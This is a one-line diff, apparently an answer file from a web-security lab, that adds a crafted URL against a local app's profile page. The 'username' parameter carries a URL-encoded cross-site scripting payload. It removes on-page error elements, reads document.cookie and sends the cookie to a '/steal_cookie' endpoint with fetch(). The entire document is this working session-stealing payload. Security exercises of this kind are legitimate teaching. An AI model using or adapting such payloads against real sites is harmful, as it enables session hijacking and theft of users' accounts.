@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=user1%3Cscript%3Edocument.querySelectorAll(%27.error%27).forEach(function%20(a)%20{%20a.remove()%20});cook%20=%20document.cookie;let%20urla%20=%20`http://localhost:3000/steal_cookie?cookie=${cook}`;(async%20()%20=%3Econsole.log((await%20(await%20fetch(%20urla%20)))))();%3C/script%3E
